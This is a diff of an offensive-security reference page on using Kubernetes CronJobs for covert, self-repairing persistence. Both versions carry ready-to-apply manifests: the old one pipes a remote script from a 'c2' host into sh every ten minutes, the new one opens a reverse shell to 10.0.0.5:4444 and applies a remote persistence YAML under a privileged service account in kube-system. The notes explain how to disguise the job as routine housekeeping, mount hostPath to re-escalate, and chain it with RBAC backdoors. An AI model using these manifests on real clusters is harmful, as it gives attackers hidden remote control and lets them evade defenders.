@@ -1,41 +1,57 @@
 ---
-title: "CronJobs: scheduled attacker execution in a cluster"
-description: "Persisting in Kubernetes with a CronJob that runs attacker code on a schedule, re-establishing a foothold periodically from a benign-looking job in an inconspicuous namespace, independent of any long-running pod."
+title: "CronJobs: scheduled re-entry into the cluster"
+description: "A CronJob runs a job on a schedule, which an attacker uses for low-footprint persistence: instead of a constantly running backdoor pod, a CronJob materialises briefly at intervals to beacon out, re-plant access, or re-create a deleted binding. Between runs there is no pod to find, making it quieter than a standing workload."
 keywords:
-  - kubernetes cronjob
+  - cronjob
   - scheduled job
   - persistence
   - beacon
-  - callback
+  - kubernetes
 ---
 
 # CronJobs
 
-A CronJob schedules a job to run on an interval. As persistence it is a periodic callback: even if every running pod is cleaned up, the CronJob re-launches attacker code at the next tick. A short schedule and a benign name make it a reliable, low-profile beacon.
+A CronJob creates a Job, and therefore a pod, on a schedule. For persistence this trades the constant presence of a backdoor workload for periodic, short-lived execution: the pod exists only while the job runs, then disappears, so between runs there is nothing standing for a defender to notice. An attacker schedules a CronJob that, each time it fires, beacons to a command channel, re-reads credentials, or re-creates persistence that was removed, making it a self-repairing and low-footprint mechanism.
+
+Requires create rights on cronjobs:
 
 ```bash
-kubectl apply -f - <<'YAML'
+kubectl auth can-i create cronjobs -n <ns>
+```
+
+## Scheduled beacon and self-repair
+
+```bash
+cat <<YAML | kubectl apply -f -
 apiVersion: batch/v1
 kind: CronJob
-metadata: { name: cert-rotate, namespace: kube-system }
+metadata: { name: log-rotate, namespace: kube-system }   # innocuous name
 spec:
-  schedule: "*/10 * * * *"
+  schedule: "*/15 * * * *"                                 # every 15 minutes
   jobTemplate:
     spec:
       template:
         spec:
+          serviceAccountName: <privileged-sa>              # act with a strong identity
           restartPolicy: Never
-          containers: [{ name: c, image: alpine, command: ["sh","-c","curl -s http://c2/x | sh"] }]
+          containers:
+          - name: c
+            image: alpine
+            command: ["/bin/sh","-c",
+              "sh -i >& /dev/tcp/10.0.0.5/4444 0>&1 || true;
+               kubectl apply -f https://a/persist.yaml"]
 YAML
 ```
 
+Running the job under a privileged service account lets each firing re-create a deleted RBAC backdoor or workload, so removing one persistence mechanism is undone at the next tick.
+
 ## Exploitation notes
 
-- The CronJob survives pod cleanup and node reboots; it only needs the API object to persist.
-- A name like `cert-rotate` or `backup` in `kube-system` passes casual review.
-- Mount a privileged or hostPath volume in the job template to re-escalate on each run.
+- The appeal is intermittency: no long-running pod to spot, and logs show only brief, periodic activity that resembles a maintenance task; name and schedule it to match plausible housekeeping.
+- Bind it to a powerful service account so each run can repair other persistence; this makes the CronJob the root of a self-healing set rather than a lone beacon.
+- A short beacon window per run is enough for a reverse shell to call out; combine with [RBAC backdoor](rbac-backdoor.md) and [Malicious workloads](malicious-workloads.md) so the mechanisms restore each other.
 
 ## References
 
-- [Kubernetes: cronjob](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)
-- [Kubernetes: jobs](https://kubernetes.io/docs/concepts/workloads/controllers/job/)
+- [Kubernetes: CronJob](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)
+- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
